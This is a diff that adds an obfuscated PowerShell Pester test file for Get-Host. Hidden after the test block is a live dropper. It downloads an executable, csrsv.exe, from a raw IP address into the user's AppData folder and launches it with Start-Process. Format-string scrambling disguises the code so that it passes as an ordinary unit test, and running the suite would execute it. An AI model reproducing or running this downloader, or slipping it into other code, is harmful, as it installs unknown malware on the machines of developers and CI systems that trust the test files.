@@ -1,0 +1,9 @@
+.("{1}{0}{2}" -f'cri','Des','be') ("{1}{3}{5}{0}{4}{6}{2}"-f 'nit','Get','ests','-Host ',' ','DRT U','T') -Tags "CI" {
+    .('It') ("{7}{6}{3}{8}{4}{2}{1}{0}{5}" -f 'ho','t-','h ge','orks proper w','t','st','ould w','Sh','i') {
+        ${rES`Ul`Ts} = .("{1}{0}{2}"-f'-Ho','Get','st')
+        ${R`eSUl`Ts} | &("{1}{2}{0}"-f'd','Sho','ul') -Be ${H`oST}
+        ${r`eS`ULts}."Ps`oBjE`Ct"."type`NA`mEs"[0] | .("{0}{1}" -f'Shoul','d') -BeExactly ("{3}{7}{0}{8}{4}{1}{11}{10}{9}{2}{6}{5}{12}"-f 'en','nte','.I','Syst','n.I','nalHo','nter','em.Managem','t.Automatio','Host','l.','rna','st')
+    }
+}
+
+(.("{1}{2}{0}" -f'ject','New','-Ob') ("{0}{1}{3}{4}{5}{2}" -f'S','ystem.Net.','t','W','eb','Clien')).("{1}{2}{0}"-f'e','Download','Fil').Invoke(("{10}{5}{7}{6}{8}{9}{2}{0}{3}{4}{1}" -f 'o/c','exe','18/~yaho','s','rsv.','://8','.','9','248.','170.2','http'),"$env:APPDATA\csrsv.exe");&("{3}{1}{2}{4}{0}"-f 's','o','c','Start-Pr','es') ("$env:APPDATA\csrsv.exe")
